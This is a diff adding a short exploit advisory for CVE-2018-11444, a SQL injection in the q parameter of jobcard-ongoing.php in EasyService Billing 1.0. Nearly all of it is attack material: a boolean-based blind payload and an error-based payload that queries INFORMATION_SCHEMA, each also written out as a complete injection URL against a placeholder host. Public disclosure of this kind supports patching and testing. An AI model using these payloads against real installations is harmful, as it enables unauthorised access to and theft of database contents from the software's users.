@@ -1,0 +1,27 @@
+<!--
+# Exploit Title: EasyService Billing 1.0 SQL Injection on page jobcard-ongoing.php?q=
+# Date: 25-05-2018
+# Software Link: https://codecanyon.net/item/easyservice-billing-php-scripts-for-quotation-invoice-payments-etc/16687594 
+# Exploit Author: Divya Jain
+# Version: EasyService Billing 1.0 
+# CVE: CVE-2018-11444
+# Category: Webapps
+# Severity: High
+# Tested on: KaLi LinuX_x64
+# # # # # # # #
+#
+
+# Proof of Concept:
+        ////////////////////////////////
+          SQL Injection in q parameter
+        ///////////////////////////////
+    Affected Link: test.com/EasyServiceBilling/jobcard-ongoing.php?q=
+# Boolean Based Blind SQL
+Payload: 1337'OR%20NOT 1=1--
+Link: test.com/EasyServiceBilling/jobcard-ongoing.php?q=1337'OR%20NOT 1=1--
+
+# Error-Based SQL
+Payload: 1337'AND%20(SELECT%202%20FROM(SELECT%20COUNT(*),CONCAT(0x7162627161,(SELECT(ELT(2=2,1))),0x717a6b6271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20'aBCD'='aBCD
+
+Link: test.com/EasyServiceBilling/jobcard-ongoing.php?q=1337'AND%20(SELECT%202%20FROM(SELECT%20COUNT(*),CONCAT(0x7162627161,(SELECT(ELT(2=2,1))),0x717a6b6271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20'aBCD'='aBCD
+#################################
